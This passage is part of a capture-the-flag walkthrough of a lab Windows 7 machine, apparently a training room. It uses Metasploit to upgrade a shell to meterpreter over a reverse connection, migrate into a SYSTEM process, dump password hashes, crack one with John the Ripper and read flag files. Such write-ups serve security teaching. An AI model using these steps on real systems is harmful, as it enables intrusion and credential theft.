<p>I backgrounded the shell using CTRL + Z</p>
<p>Let&rsquo;s search the correct post-exploitation module to convert this basic shell
to a meterpreter shell!</p>
<p><code>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; search -t post meterpreter</code></p>
<p>This one sounds good: <code>post/multi/manage/shell_to_meterpreter</code></p>
<ul>
<li>Select this (use MODULE_PATH). Show options, what option are we required to change?</li>
</ul>
<p><code>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; use post/multi/manage/shell_to_meterpreter</code></p>
<pre><code class="language-bash">msf6 post(multi/manage/shell_to_meterpreter) &gt; show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto d
                                       etect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on
</code></pre>
<p>The options we need to set is the <code>SESSION</code> option.</p>
<ul>
<li>Set the required option, you may need to list all of the sessions to find your target here.</li>
</ul>
<p>Let&rsquo;s find the correct session first.</p>
<p>I have a ton of sessions open&hellip; I will try the first one.</p>
<pre><code class="language-bash">msf6 post(multi/manage/shell_to_meterpreter) &gt; sessions

Active sessions
===============

  Id   Name  Type               Information                                 Connection
  --   ----  ----               -----------                                 ----------
  1          shell x64/windows  Shell Banner: Microsoft Windows [Version 6  10.8.33.96:4444 -&gt; 10.10.14.17:49172  (10.1
                                .1.7601] -----                              0.14.17)
</code></pre>
<pre><code class="language-bash">msf6 post(multi/manage/shell_to_meterpreter) &gt; set SESSION 1
SESSION =&gt; 1
</code></pre>
<ul>
<li>Run! If this doesn&rsquo;t work, try completing the exploit from the previous task once more.</li>
</ul>
<pre><code class="language-bash">msf6 post(multi/manage/shell_to_meterpreter) &gt; run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.8.33.96:4433 
[*] Post module execution completed
</code></pre>
<p>That did not work.</p>
<p>I will try it with the last one&hellip;</p>
<pre><code class="language-bash">msf6 post(multi/manage/shell_to_meterpreter) &gt; set SESSION 264
SESSION =&gt; 264
</code></pre>
<pre><code class="language-bash">msf6 post(multi/manage/shell_to_meterpreter) &gt; run

[*] Upgrading session ID: 264
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.8.33.96:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) &gt; 
[*] Sending stage (200262 bytes) to 10.10.14.17
[*] Meterpreter session 265 opened (10.8.33.96:4433 -&gt; 10.10.14.17:49701 ) at 2022-04-09 02:50:03 +0200
[*] Stopping exploit/multi/handler
</code></pre>
<p>Ok so this looks way better!</p>
<ul>
<li>Once the meterpreter shell conversion completes, select that session for use.</li>
</ul>
<p>After looking at the sessions with the command <code>sessions</code>
I saw a new session</p>
<pre><code class="language-bash">265        meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC             10.8.33.96:4433 -&gt; 10.10.14.17:49701  (1
                                                                               0.10.14.17)
</code></pre>
<p>Let&rsquo;s try to interact with it!</p>
<pre><code class="language-bash">msf6 post(multi/manage/shell_to_meterpreter) &gt; sessions -i 265
[*] Starting interaction with 265...

meterpreter &gt;
</code></pre>
<p>We finally got a meterpreter shell!</p>
<p>And it is working:</p>
<pre><code class="language-bash">meterpreter &gt; sysinfo
Computer        : JON-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
</code></pre>
<p>We can see that the system is running Windows 7 x64</p>
<ul>
<li>Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command &lsquo;shell&rsquo; and run &lsquo;whoami&rsquo;. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.</li>
</ul>
<p>Using the getuid command I can see with which user we are currently interacting with</p>
<pre><code class="language-bash">meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
</code></pre>
<p>Looks like we got system rights. The user NT AUTHORITY\SYSTEM has even more
rights than an administrator under Windows.</p>
<ul>
<li>List all of the processes running via the &lsquo;ps&rsquo; command. Just because we are system doesn&rsquo;t mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).</li>
</ul>
<pre><code class="language-bash">meterpreter &gt; ps

Process List
============

 PID   PPID  Name                 Arch  Session  User                          Path
 ---   ----  ----                 ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System               x64   0
 416   4     smss.exe             x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 460   668   LogonUI.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 484   716   svchost.exe          x64   0        NT AUTHORITY\SYSTEM
 568   560   csrss.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 616   560   wininit.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 628   608   csrss.exe            x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 668   608   winlogon.exe         x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 716   616   services.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 724   616   lsass.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 732   616   lsm.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 788   716   svchost.exe          x64   0        NT AUTHORITY\SYSTEM
 844   716   svchost.exe          x64   0        NT AUTHORITY\SYSTEM
 912   716   svchost.exe          x64   0        NT AUTHORITY\NETWORK SERVICE
 960   716   svchost.exe          x64   0        NT AUTHORITY\LOCAL SERVICE
 1124  716   svchost.exe          x64   0        NT AUTHORITY\LOCAL SERVICE
 1216  716   svchost.exe          x64   0        NT AUTHORITY\NETWORK SERVICE
 1244  716   TrustedInstaller.ex  x64   0        NT AUTHORITY\SYSTEM
             e
 1324  716   spoolsv.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1368  716   svchost.exe          x64   0        NT AUTHORITY\LOCAL SERVICE
 1388  568   conhost.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 1464  2564  powershell.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v
                                                                               1.0\powershell.exe
 1468  716   amazon-ssm-agent.ex  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-
             e                                                                 agent.exe
 1524  716   LiteAgent.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAg
                                                                               ent.exe
 1680  716   Ec2Config.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigServic
                                                                               e\Ec2Config.exe
 1964  844   WmiPrvSE.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wbem\wmiprvse.exe
 1980  716   svchost.exe          x64   0        NT AUTHORITY\NETWORK SERVICE
 2132  844   WmiPrvSE.exe
 2228  1324  cmd.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 2600  716   SearchIndexer.exe    x64   0        NT AUTHORITY\SYSTEM
 2612  716   vds.exe              x64   0        NT AUTHORITY\SYSTEM
 2736  568   conhost.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 2856  716   mscorsvw.exe         x86   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework\v4.0
                                                                               .30319\mscorsvw.exe
 2888  716   mscorsvw.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4
                                                                               .0.30319\mscorsvw.exe
 2928  716   svchost.exe          x64   0        NT AUTHORITY\LOCAL SERVICE
 2972  716   sppsvc.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 2996  716   svchost.exe          x64   0        NT AUTHORITY\SYSTEM
</code></pre>
<p>We could use this one here <code>2888  716   mscorsvw.exe         x64   0        NT AUTHORITY\SYSTEM</code></p>
<p>This process if for the ms windows core services and it is running as SYSTEM</p>
<p>The process id is <code>2888</code></p>
<ul>
<li>Migrate to this process using the &lsquo;migrate PROCESS_ID&rsquo; command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.</li>
</ul>
<pre><code class="language-bash">meterpreter &gt; migrate 2888
[*] Migrating from 1464 to 2888...
[*] Migration completed successfully.
</code></pre>
<p>Looks like the migration worked fine.</p>
<hr>
<h2 id="task-4-cracking">Task 4: Cracking</h2>
<h3 id="dump-the-non-default-users-password-and-crack-it">Dump the non-default user&rsquo;s password and crack it!</h3>
<hr>
<ul>
<li>Within our elevated meterpreter shell, run the command &lsquo;hashdump&rsquo;. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?</li>
</ul>
<pre><code class="language-bash">meterpreter &gt; hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
</code></pre>
<p>The name of the non-default user is <code>Jon</code> here.</p>
<ul>
<li>Copy this password hash to a file and research how to crack it. What is the cracked password?</li>
</ul>
<p>Ok so let&rsquo;s copy the hash to a file <code>hash.txt</code></p>
<pre><code class="language-bash">echo &quot;Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::&quot; &gt; hash.txt
</code></pre>
<p>the hash format should be NT</p>
<p>Let&rsquo;s try to crack it using john the ripper and use the wordlist rockyou.txt since it contains
a lot of commonly used passwords!</p>
<pre><code class="language-bash">sudo john --format=nt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt                                      1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (Jon)     
1g 0:00:00:00 DONE (2022-04-09 03:26) 1.923g/s 19616Kp/s 19616Kc/s 19616KC/s alr19882006..alpusidi
Use the &quot;--show --format=NT&quot; options to display all of the cracked passwords reliably
Session completed.
</code></pre>
<p>We successfully cracked the password hash!</p>
<p>The passwords for the user <code>Jon</code> is <code>alqfna22</code> !</p>
<hr>
<h2 id="task-5-find-flags">Task 5: Find flags!</h2>
<h3 id="find-the-three-flags-planted-on-this-machine-these-are-not-traditional-flags-rather-theyre-meant-to-represent-key-locations-within-the-windows-system-use-the-hints-provided-below-to-complete-this-room">Find the three flags planted on this machine. These are not traditional flags, rather, they&rsquo;re meant to represent key locations within the Windows system. Use the hints provided below to complete this room!</h3>
<hr>
<ul>
<li>Flag1? This flag can be found at the system root.</li>
</ul>
<p>Let&rsquo;s switch back to our terminal session 1</p>
<pre><code class="language-bash">msf6 post(multi/manage/shell_to_meterpreter) &gt; sessions -i 1
[*] Starting interaction with 1...


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32&gt;
</code></pre>
<p>and locate the flag</p>
<pre><code class="language-bash">C:\Windows\system32&gt;cd ..
cd ..

C:\Windows&gt;cd ..
cd ..

C:\&gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\

03/17/2019  02:27 PM                24 flag1.txt
07/13/2009  10:20 PM    &lt;DIR&gt;          PerfLogs
04/12/2011  03:28 AM    &lt;DIR&gt;          Program Files
03/17/2019  05:28 PM    &lt;DIR&gt;          Program Files (x86)
12/12/2018  10:13 PM    &lt;DIR&gt;          Users
03/17/2019  05:36 PM    &lt;DIR&gt;          Windows
               1 File(s)             24 bytes
               5 Dir(s)  20,617,707,520 bytes free
</code></pre>
<p>the flag is called flag1.txt</p>
<p>let&rsquo;s get the contents of it:</p>
<pre><code class="language-bash">C:\&gt;type flag1.txt
type flag1.txt
flag{access_the_machine}
</code></pre>
<p>We managed to get the first flag!</p>
<ul>
<li>Flag2? This flag can be found at the location where passwords are stored within Windows.</li>
</ul>
<p>*Errata: Windows really doesn&rsquo;t like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.</p>
<p>Passwords in windows are usually stored in the SAM database.</p>
<p>This database is located in <code>C:\Windows\System32\config</code></p>
<pre><code class="language-bash">cd C:\Windows\System32\config
</code></pre>
<pre><code class="language-bash">C:\Windows\System32\config&gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Windows\System32\config

04/08/2022  08:11 PM    &lt;DIR&gt;          .
04/08/2022  08:11 PM    &lt;DIR&gt;          ..
12/12/2018  06:00 PM            28,672 BCD-Template
04/08/2022  08:19 PM        18,087,936 COMPONENTS
04/08/2022  08:20 PM           262,144 DEFAULT
03/17/2019  02:32 PM                34 flag2.txt
07/13/2009  09:34 PM    &lt;DIR&gt;          Journal
03/17/2019  02:56 PM    &lt;DIR&gt;          RegBack
03/17/2019  03:05 PM           262,144 SAM
04/08/2022  08:20 PM           262,144 SECURITY
04/08/2022  08:37 PM        40,632,320 SOFTWARE
04/08/2022  08:33 PM        12,582,912 SYSTEM
11/20/2010  09:41 PM    &lt;DIR&gt;          systemprofile
12/12/2018  06:03 PM    &lt;DIR&gt;          TxR
               8 File(s)     72,118,306 bytes
               6 Dir(s)  20,617,707,520 bytes free
</code></pre>
<p>There is the file we are looking for.</p>
<p>It is <code>SAM</code>.</p>
<p>And here is our second flag!</p>
<pre><code class="language-bash">C:\Windows\System32\config&gt;type flag2.txt
type flag2.txt
flag{sam_database_elevated_access}
</code></pre>
<ul>
<li>flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.</li>
</ul>
<p>This is a hint to look at the home directory of the admin user.</p>
<p>Let&rsquo;s see what he has hidden there &hellip;</p>
<p>There is no user <code>Administrator</code> in the directory <code>C:\Users</code>.</p>
<p>But instead there is a user folder for the user <code>Jon</code>.</p>
<p>Let&rsquo;s see what he is hiding there &hellip;</p>
<pre><code class="language-bash">C:\Users&gt;cd C:\Users\Jon
</code></pre>
<pre><code class="language-bash">C:\Users\Jon&gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Users\Jon

12/12/2018  10:13 PM    &lt;DIR&gt;          .
12/12/2018  10:13 PM    &lt;DIR&gt;          ..
12/12/2018  10:13 PM    &lt;DIR&gt;          Contacts
12/12/2018  10:49 PM    &lt;DIR&gt;          Desktop
12/12/2018  10:49 PM    &lt;DIR&gt;          Documents
12/12/2018  10:13 PM    &lt;DIR&gt;          Downloads
12/12/2018  10:13 PM    &lt;DIR&gt;          Favorites
12/12/2018  10:13 PM    &lt;DIR&gt;          Links
12/12/2018  10:13 PM    &lt;DIR&gt;          Music
12/12/2018  10:13 PM    &lt;DIR&gt;          Pictures
12/12/2018  10:13 PM    &lt;DIR&gt;          Saved Games
12/12/2018  10:13 PM    &lt;DIR&gt;          Searches
12/12/2018  10:13 PM    &lt;DIR&gt;          Videos
               0 File(s)              0 bytes
              13 Dir(s)  20,619,608,064 bytes free
</code></pre>
<p>Mh nothing?</p>
<p>Let&rsquo;s take a look at his documents.</p>
<pre><code class="language-bash">C:\Users\Jon&gt;dir Documents
dir Documents
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Users\Jon\Documents

12/12/2018  10:49 PM    &lt;DIR&gt;          .
12/12/2018  10:49 PM    &lt;DIR&gt;          ..
03/17/2019  02:26 PM                37 flag3.txt
               1 File(s)             37 bytes
               2 Dir(s)  20,619,608,064 bytes free
</code></pre>
<p>Gotcha! There is our third flag!</p>
<pre><code class="language-bash">C:\Users\Jon&gt;cd Documents
cd Documents

C:\Users\Jon\Documents&gt;type flag3.txt
type flag3.txt
flag{admin_documents_can_be_valuable}
</code></pre>
<p>We managed to get the third and last flag
and thus successfully completed this room!</p>
<p><strong>Thanks for tuning in!</strong></p>
]]></description></item></channel></rss>